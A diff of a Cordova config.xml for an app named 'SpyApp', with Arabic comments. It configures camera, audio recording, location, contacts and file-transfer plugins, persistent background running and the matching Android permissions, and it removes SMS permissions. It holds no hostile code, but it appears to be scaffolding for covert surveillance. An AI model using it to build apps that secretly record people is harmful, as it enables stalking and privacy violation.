@@ -1,19 +1,66 @@
-<edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">    
-    <manifest xmlns:android="http://schemas.android.com/apk/res/android"    
-              xmlns:tools="http://schemas.android.com/tools">    
-        <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />    
-        <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />    
-        <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />    
-        <uses-permission android:name="android.permission.CAMERA" />    
-        <uses-permission android:name="android.permission.RECORD_AUDIO" />    
-        <uses-permission android:name="android.permission.READ_SMS" />    
-        <uses-permission android:name="android.permission.RECEIVE_SMS" />    
-        <uses-permission android:name="android.permission.SEND_SMS" />    
-        <uses-permission android:name="android.permission.INTERNET" />    
-        <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />    
-        <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />    
+<?xml version='1.0' encoding='utf-8'?>
+<widget id="com.spyapp.spy" version="1.0.1" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
+    <name>SpyApp</name>
+    <content src="index.html" />
+    <access origin="*" />
+    <allow-intent href="http://*/*" />
+    <allow-intent href="https://*/*" />
+    <allow-intent href="tel:*" />
+    <allow-intent href="sms:*" />
+    <allow-intent href="mailto:*" />
+    <allow-intent href="geo:*" />
 
-        <!-- أذونات إضافية لأندرويد 11+ -->    
-        <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />    
-    </manifest>    
-</edit-config>
+    <!-- ✅ استهداف آخر SDK -->
+    <preference name="android-targetSdkVersion" value="34" />
+
+    <!-- ✅ الإضافات (Plugins) -->
+    <plugin name="cordova-plugin-camera" />
+    <plugin name="cordova-plugin-media-capture" />
+    <plugin name="cordova-plugin-contacts" />
+    <plugin name="cordova-plugin-file" />
+    <plugin name="cordova-plugin-file-transfer" />
+    <plugin name="cordova-plugin-geolocation" />
+    <plugin name="cordova-plugin-android-permissions" />
+    <plugin name="cordova-plugin-media" />
+    <plugin name="cordova-plugin-background-mode" />
+    <plugin name="cordova-plugin-dialogs" />
+
+    <!-- ✅ التفضيلات (Preferences) -->
+    <preference name="KeepRunning" value="true" />
+    <preference name="BackgroundMode" value="audio" />
+
+    <platform name="android">
+        <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
+            <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+                      xmlns:tools="http://schemas.android.com/tools">
+
+                <!-- 🗂️ التخزين -->
+                <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+                <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+                                 android:maxSdkVersion="29" />
+
+                <!-- 🎤 الكاميرا والصوت -->
+                <uses-permission android:name="android.permission.CAMERA" />
+                <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+                <!-- 📍 الموقع -->
+                <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+
+                <!-- 🌐 الشبكة -->
+                <uses-permission android:name="android.permission.INTERNET" />
+
+                <!-- 🔔 الإشعارات (Android 13+) -->
+                <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+                <!-- ⚡ تشغيل بالخلفية -->
+                <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+                <uses-permission android:name="android.permission.WAKE_LOCK" />
+                <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+
+                <!-- ⚠️ اختيارية (مرفوضة في Google Play غالباً) -->
+                <!-- <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" /> -->
+
+            </manifest>
+        </edit-config>
+    </platform>
+</widget>
